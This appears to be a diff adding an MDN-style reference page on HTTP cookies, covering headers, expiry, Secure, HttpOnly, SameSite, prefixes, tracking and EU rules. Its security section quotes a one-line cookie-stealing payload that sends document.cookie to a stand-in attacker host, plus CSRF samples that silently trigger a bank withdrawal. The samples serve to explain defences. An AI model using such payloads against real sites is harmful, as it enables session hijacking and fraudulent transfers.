@@ -1,0 +1,245 @@
+<p>{{HTTPSidebar}}</p>
+
+<p class="summary"><span class="seoSummary">An <dfn>HTTP cookie</dfn> (web cookie, browser cookie) is a small piece of data that a server sends to the user's web browser. The browser may store it and send it back with the next request to the same server.</span> Typically, it's used to tell if two requests came from the same browser — keeping a user logged-in, for example. It remembers stateful information for the <a href="/en-US/docs/Web/HTTP/Overview#HTTP_is_stateless_but_not_sessionless">stateless</a> HTTP protocol.</p>
+
+<p>Cookies are mainly used for three purposes:</p>
+
+<dl>
+ <dt>Session management</dt>
+ <dd>Logins, shopping carts, game scores, or anything else the server should remember</dd>
+ <dt>Personalization</dt>
+ <dd>User preferences, themes, and other settings</dd>
+ <dt>Tracking</dt>
+ <dd>Recording and analyzing user behavior</dd>
+</dl>
+
+<p>Cookies were once used for general client-side storage. While this was legitimate when they were the only way to store data on the client, it is recommended nowadays to prefer modern storage APIs. Cookies are sent with every request, so they can worsen performance (especially for mobile data connections). Modern APIs for client storage are the <a href="/en-US/docs/Web/API/Web_Storage_API" title="DOM Storage">Web storage API</a> (<code>localStorage</code> and <code>sessionStorage</code>) and <a href="/en-US/docs/Web/API/IndexedDB_API">IndexedDB</a>.</p>
+
+<div class="note">
+<p>To see stored cookies (and other storage that a web page can use), you can enable the <a href="/en-US/docs/Tools/Storage_Inspector">Storage Inspector</a> in Developer Tools and select Cookies from the storage tree.</p>
+</div>
+
+<h2 id="Creating_cookies">Creating cookies</h2>
+
+<p>When receiving an HTTP request, a server can send a {{HTTPHeader("Set-Cookie")}} header with the response. The cookie is usually stored by the browser, and then the cookie is sent with requests made to the same server inside a {{HTTPHeader("Cookie")}} HTTP header. An expiration date or duration can be specified, after which the cookie is no longer sent. Additionally, restrictions to a specific domain and path can be set, limiting where the cookie is sent.</p>
+
+<h3 id="The_Set-Cookie_and_Cookie_headers">The <code>Set-Cookie</code> and <code>Cookie</code> headers</h3>
+
+<p>The {{HTTPHeader("Set-Cookie")}} HTTP response header sends cookies from the server to the user agent. A simple cookie is set like this:</p>
+
+<pre class="syntaxbox">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;</pre>
+
+<p>This header from the server tells the client to store a cookie.</p>
+
+<div class="note"><strong>Note:</strong> Here's how to use the <code>Set-Cookie</code> header in various server-side applications:
+
+<ul>
+ <li><a href="https://secure.php.net/manual/en/function.setcookie.php">PHP</a></li>
+ <li><a href="https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value">Node.JS</a></li>
+ <li><a href="https://docs.python.org/3/library/http.cookies.html">Python</a></li>
+ <li><a href="https://api.rubyonrails.org/classes/ActionDispatch/Cookies.html">Ruby on Rails</a></li>
+</ul>
+</div>
+
+<pre>HTTP/2.0 200 OK
+Content-type: text/html
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+
+[page content]</pre>
+
+<p id="The_client_sends_back_to_the_server_its_cookies_previously_stored">Now, with every new request to the server, the browser will send back all previously stored cookies to the server using the {{HTTPHeader("Cookie")}} header.</p>
+
+<pre>GET /sample_page.html HTTP/2.0
+Host: www.example.org
+Cookie: yummy_cookie=choco; tasty_cookie=strawberry</pre>
+
+<h3 id="Session_cookies">Session cookies</h3>
+
+<p>The cookie created above is a <em>session cookie</em>: it is deleted when the client shuts down, because it didn't specify an <code>Expires</code> or <code>Max-Age</code> directive. However, web browsers may use <strong>session restoring</strong>, which makes most session cookies permanent, as if the browser was never closed.</p>
+
+<h3 id="Permanent_cookies">Permanent cookies</h3>
+
+<p>Instead of expiring when the client closes,<em> permanent cookies</em> expire at a specific date (<code>Expires</code>) or after a specific length of time (<code>Max-Age</code>).</p>
+
+<pre>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</pre>
+
+<div class="note">
+<p><strong>Note</strong>: When an expiry date is set, the time and date set is relative to the client the cookie is being set on, not the server.</p>
+</div>
+
+<h3 id="Secure_and_HttpOnly_cookies"><code>Secure</code> and <code>HttpOnly</code> cookies</h3>
+
+<p>A secure cookie is only sent to the server with an encrypted request over the HTTPS protocol. Even with <code>Secure</code>, sensitive information should <em>never</em> be stored in cookies, as they are inherently insecure and this flag can't offer real protection. Starting with Chrome 52 and Firefox 52, insecure sites (<code>http:</code>) can't set cookies with the <code>Secure</code> directive.</p>
+
+<p>To help mitigate cross-site scripting ({{Glossary("XSS")}}) attacks, <code>HttpOnly</code> cookies are inaccessible to JavaScript's {{domxref("Document.cookie")}} API; they are only sent to the server. For example, cookies that persist server-side sessions don't need to be available to JavaScript, and the <code>HttpOnly</code> flag should be set.</p>
+
+<pre>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</pre>
+
+<h3 id="Scope_of_cookies">Scope of cookies</h3>
+
+<p>The <code>Domain</code> and <code>Path</code> directives define the <em>scope</em> of the cookie: what URLs the cookies should be sent to.</p>
+
+<p><code>Domain</code> specifies allowed hosts to receive the cookie. If unspecified, it defaults to the <a href="/en-US/docs/Web/API/Document/location">host of the current document location</a>, <strong>excluding subdomains</strong>. If <code>Domain</code> <em>is</em> specified, then subdomains are always included.</p>
+
+<p>For example, if <code>Domain=mozilla.org</code> is set, then cookies are included on subdomains like <code>developer.mozilla.org</code>.</p>
+
+<p><code>Path</code> indicates a URL path that must exist in the requested URL in order to send the <code>Cookie</code> header. The %x2F ("/") character is considered a directory separator, and subdirectories will match as well.</p>
+
+<p>For example, if <code>Path=/docs</code> is set, these paths will match:</p>
+
+<ul>
+ <li><code>/docs</code></li>
+ <li><code>/docs/Web/</code></li>
+ <li><code>/docs/Web/HTTP</code></li>
+</ul>
+
+<h3 id="SameSite_cookies_experimental_inline"><code>SameSite</code> cookies {{experimental_inline}}</h3>
+
+<p><code>SameSite</code> cookies let servers require that a cookie shouldn't be sent with cross-site (where {{Glossary("Site")}} is defined by the registrable domain) requests, which provides some protection against cross-site request forgery attacks ({{Glossary("CSRF")}}).</p>
+
+<p><code>SameSite</code> cookies are relatively new and <a href="/en-US/docs/Web/HTTP/headers/Set-Cookie#Browser_compatibility">supported by all major browsers</a>.</p>
+
+<p>Here is an example:</p>
+
+<pre>Set-Cookie: key=value; SameSite=Strict</pre>
+
+<p>The <code>SameSite</code> attribute can have one of three values (case-insensitive):</p>
+
+<dl>
+ <dt><code>None</code></dt>
+ <dd>The browser will send cookies with both cross-site requests and same-site requests.</dd>
+ <dt><code>Strict</code></dt>
+ <dd>The browser will only send cookies for same-site requests (requests originating from the site that set the cookie). If the request originated from a different URL than the URL of the current location, none of the cookies tagged with the <code>Strict</code> attribute will be included.</dd>
+ <dt><code>Lax</code></dt>
+ <dd>Same-site cookies are withheld on cross-site subrequests, such as calls to load images or frames, but will be sent when a user navigates to the URL from an external site; for example, by following a link.</dd>
+</dl>
+
+<div class="blockIndicator note">
+<p>Browsers are migrating to have <a href="https://www.chromestatus.com/feature/5088147346030592">cookies default to <code>SameSite=Lax</code></a>. If a cookie is needed to be sent cross-origin, opt out of the SameSite restriction using the <code>None</code> directive. The <code>None</code> directive requires the <a href="#Secure_and_HttpOnly_cookies"><code>Secure</code></a> attribute.</p>
+</div>
+
+<h3 id="Cookie_prefixes_experimental_inline">Cookie prefixes {{experimental_inline}}</h3>
+
+<p>The design of the cookie mechanism is such that a server is unable to confirm a cookie was set on a secure origin or indeed, tell <em>where</em> a cookie was originally set. Recall that a subdomain such as <code>application.example.com</code> can set a cookie that will be sent with requests to <code>example.com</code> or other sub-domains by setting the <em>Domain</em> attribute:</p>
+
+<pre class="syntaxbox">Set-Cookie: CSRF=e8b667; Secure; Domain=example.com</pre>
+
+<p>If a vulnerable application is available on a sub-domain, this mechanism can be abused in a <em>session fixation</em> attack. When the user visits a page on the parent domain (or another subdomain), the application may trust the existing value sent in the user's cookie. This could allow an attacker to bypass CSRF protection or hijack a session after the user logs in.</p>
+
+<p>Alternatively, if the parent domain does not use {{Glossary("HSTS")}} with <code>includeSubdomains</code> set, a user subject to an active MitM (perhaps connected to an open WiFi network) could be served a response with a {{HTTPHeader("Set-Cookie")}} header from a non-existent sub-domain. The end result would be much the same, with the browser storing the illegitimate cookie and sending it to all other pages under <code>example.com</code>.</p>
+
+<p>Session fixation should primarily be mitigated by regenerating session cookie values when the user authenticates (even if a cookie already exists) and by tieing any CSRF token to the user. As a defence in depth measure, however, it is possible to use <em>cookie prefixes</em> to assert specific facts about the cookie. Two prefixes are available:</p>
+
+<dl>
+ <dt><code>__Host-</code></dt>
+ <dd>If a cookie name has this prefix, it will only be accepted in a {{HTTPHeader("Set-Cookie")}} directive if it is marked <code>Secure</code>, was sent from a secure origin, does <em>not</em> include a <code>Domain</code> attribute, and has the <code>Path</code> attribute set to <code>/</code>. In this way, these cookies can be seen as "domain-locked".</dd>
+ <dt><code>__Secure-</code></dt>
+ <dd>If a cookie name has this prefix, it will only be accepted in a {{HTTPHeader("Set-Cookie")}} directive if it is marked <code>Secure</code> and was sent from a secure origin. This is weaker than the <code>__Host-</code> prefix.</dd>
+</dl>
+
+<p>Cookies sent which are not compliant will be rejected by the browser. Note that this ensures that if a sub-domain were to create a cookie with this name, it would be either be confined to the sub-domain or ignored completely. As the application server will only check for a specific cookie name when determining if the user is authenticated or a CSRF token is correct, this effectively acts as a defence measure against session fixation.</p>
+
+<div class="note">
+<p>On the application server, the web application <em>must</em> check for the full cookie name including the prefix—user agents <em>will not</em> strip the prefix from the cookie before sending it in a request's {{HTTPHeader("Cookie")}} header.</p>
+</div>
+
+<p>For more information about cookie prefixes and the current state of browser support, see the <a href="/en-US/docs/Web/HTTP/Headers/Set-Cookie#Cookie_prefixes">Set-Cookie section</a>.</p>
+
+<h3 id="JavaScript_access_using_Document.cookie">JavaScript access using <code>Document.cookie</code></h3>
+
+<p>New cookies can also be created via JavaScript using the {{domxref("Document.cookie")}} property, and if the <code>HttpOnly</code> flag is not set, existing cookies can be accessed from JavaScript as well.</p>
+
+<pre class="brush: js">document.cookie = "yummy_cookie=choco"; 
+document.cookie = "tasty_cookie=strawberry"; 
+console.log(document.cookie); 
+// logs "yummy_cookie=choco; tasty_cookie=strawberry"</pre>
+
+<p>Cookies created via JavaScript cannot include the <code>HttpOnly</code> flag.</p>
+
+<p>Please note the security issues in the <a href="/en-US/docs/Web/HTTP/Cookies#Security">Security</a> section below. Cookies available to JavaScript can be stolen through XSS.</p>
+
+<h2 id="Security">Security</h2>
+
+<div class="note">
+<p>Information should be stored in cookies with the understanding that all cookie values will be visible to and can be changed by the end-user. Depending on the application, it may be desirable to use an opaque identifier which is looked-up server-side or investigate alternative authentication/confidentiality mechanisms such as JSON Web Tokens.</p>
+</div>
+
+<h3 id="Session_hijacking_and_XSS">Session hijacking and XSS</h3>
+
+<p>Cookies are often used in web application to identify a user and their authenticated session, so stealing a cookie can lead to hijacking the authenticated user's session. Common ways to steal cookies include Social Engineering or exploiting an {{Glossary("XSS")}} vulnerability in the application.</p>
+
+<pre class="brush: js">(new Image()).src = "http://www.evil-domain.com/steal-cookie?cookie=" + document.cookie;</pre>
+
+<p>The <code>HttpOnly</code> cookie attribute can help to mitigate this attack by preventing access to cookie value through JavaScript. Exfiltration avenues can be limited by deploying a strict <a href="/en-US/docs/Web/HTTP/CSP">Content-Security-Policy</a>.</p>
+
+<h3 id="Cross-site_request_forgery_CSRF">Cross-site request forgery (CSRF)</h3>
+
+<p><a href="https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery">Wikipedia</a> mentions a good example for {{Glossary("CSRF")}}. In this situation, someone includes an image that isn’t really an image (for example in an unfiltered chat or forum), instead it really is a request to your bank’s server to withdraw money:</p>
+
+<pre class="brush: html">&lt;img src="https://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory"&gt;</pre>
+
+<p>Now, if you are logged into your bank account and your cookies are still valid (and there is no other validation), you will transfer money as soon as you load the HTML that contains this image. For endpoints that require a POST request, it's possible to programmatically trigger a <code>&lt;form&gt;</code> submit (perhaps in an invisible <code>&lt;iframe&gt;</code>) when the page is loaded:</p>
+
+<pre class="brush: html">&lt;form action="https://bank.example.com/withdraw" method="POST"&gt;
+  &lt;input type="hidden" name="account" value="bob"&gt;
+  &lt;input type="hidden" name="amount" value="1000000"&gt;
+  &lt;input type="hidden" name="for" value="mallory"&gt;
+&lt;/form&gt;
+&lt;script&gt;window.addEventListener('DOMContentLoaded', (e) =&gt; { document.querySelector('form').submit(); }&lt;/script&gt;
+</pre>
+
+<p>There are a few techniques that should be used to prevent this from happening:</p>
+
+<ul>
+ <li>GET endpoints should be idempotent—actions that enact a <em>change </em>and do not simply retrieve data should require sending a POST (or other HTTP method) request. POST endpoints should not interchangeably accept GET requests with parameters in the query string.</li>
+ <li>A CSRF token should be included in <code>&lt;form&gt;</code> elements via a hidden input field. This token should be unique per user and stored (for example, in a cookie) such that the server can look up the expected value when the request is sent. For all non-GET requests that have the potential to perform an action, this input field should be compared against the expected value. If there is a mismatch, the request should be aborted.
+  <ul>
+   <li>This method of protection relies on an attacker being unable to predict the user's assigned CSRF token. The token should be regenerated on sign-in.</li>
+  </ul>
+ </li>
+ <li>Cookies that are used for sensitive actions (such as session cookies) should have a short lifetime with the SameSite attribute set to <code>Strict</code> or <code>Lax</code>. (See <a href="/en-US/docs/Web/HTTP/Cookies#SameSite_cookies">SameSite cookies</a> above). In supporting browsers, this will have the effect of ensuring that the session cookie is <em>not</em> sent along with cross-site requests and so the request is effectively unauthenticated to the application server.</li>
+ <li>Both CSRF tokens and SameSite cookies should be deployed. This ensures all browsers are protected and provides protection where SameSite cookies cannot help (such as attacks originating from a separate subdomain).</li>
+ <li>For more prevention tips, see the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP CSRF prevention cheat sheet</a>.</li>
+</ul>
+
+<h2 id="Tracking_and_privacy">Tracking and privacy</h2>
+
+<h3 id="Third-party_cookies">Third-party cookies</h3>
+
+<p>Cookies have a domain associated to them. If this domain is the same as the domain of the page you are on, the cookies is said to be a <em>first-party cookie</em>. If the domain is different, it is said to be a <em>third-party cookie</em>. While first-party cookies are sent only to the server setting them, a web page may contain images or other components stored on servers in other domains (like ad banners). Cookies that are sent through these third-party components are called third-party cookies and are mainly used for advertising and tracking across the web. See for example the <a href="https://www.google.com/policies/technologies/types/">types of cookies used by Google</a>. Most browsers allow third-party cookies by default, but there are add-ons available to block them (for example, <a href="https://addons.mozilla.org/en-US/firefox/addon/privacy-badger-firefox/">Privacy Badger</a> by the <a href="https://www.eff.org/">EFF</a>).</p>
+
+<p>If you are not disclosing third-party cookies, consumer trust might get harmed if cookie use is discovered. A clear disclosure (such as in a privacy policy) tends to eliminate any negative effects of a cookie discovery. Some countries also have legislation about cookies. See for example Wikimedia Foundation's <a href="https://wikimediafoundation.org/wiki/Cookie_statement">cookie statement</a>.</p>
+
+<h3 id="Do-Not-Track">Do-Not-Track</h3>
+
+<p>There are no legal or technological requirements for its use, but the {{HTTPHeader("DNT")}} header can be used to signal that a web application should disable either its tracking or cross-site user tracking of an individual user. See the {{HTTPHeader("DNT")}} header for more information.</p>
+
+<h3 id="EU_cookie_directive">EU cookie directive</h3>
+
+<p>Requirements for cookies across the EU are defined in <a href="http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136">Directive 2009/136/EC</a> of the European Parliament and came into effect on 25 May 2011. A directive is not a law by itself, but a requirement for EU member states to put laws in place that meet the requirements of the directive. The actual laws can differ from country to country.</p>
+
+<p>In short the EU directive means that before somebody can store or retrieve any information from a computer, mobile phone or other device, the user must give informed consent to do so. Many websites have added banners (AKA "cookie banners") since then to inform the user about the use of cookies.</p>
+
+<p>For more, see <a href="https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive">this Wikipedia section</a> and consult state laws for the latest and most accurate information.</p>
+
+<h3 id="Zombie_cookies_and_Evercookies">Zombie cookies and Evercookies</h3>
+
+<p>A more radical approach to cookies are zombie cookies or "Evercookies" which are recreated after their deletion and are intentionally hard to delete forever. They are using the <a href="/en-US/docs/Web/API/Web_Storage_API" title="DOM Storage">Web storage API</a>, Flash Local Shared Objects and other techniques to recreate themselves whenever the cookie's absence is detected.</p>
+
+<ul>
+ <li><a href="https://github.com/samyk/evercookie">Evercookie by Samy Kamkar</a></li>
+ <li><a href="https://en.wikipedia.org/wiki/Zombie_cookie">Zombie cookies on Wikipedia</a></li>
+</ul>
+
+<h2 id="See_also">See also</h2>
+
+<ul>
+ <li>{{HTTPHeader("Set-Cookie")}}</li>
+ <li>{{HTTPHeader("Cookie")}}</li>
+ <li>{{domxref("Document.cookie")}}</li>
+ <li>{{domxref("Navigator.cookieEnabled")}}</li>
+ <li><a href="/en-US/docs/Tools/Storage_Inspector">Inspecting cookies using the Storage Inspector</a></li>
+ <li><a class="external" href="https://tools.ietf.org/html/rfc6265">Cookie specification: RFC 6265</a></li>
+ <li><a href="https://en.wikipedia.org/wiki/HTTP_cookie">HTTP cookie on Wikipedia</a></li>
+</ul>
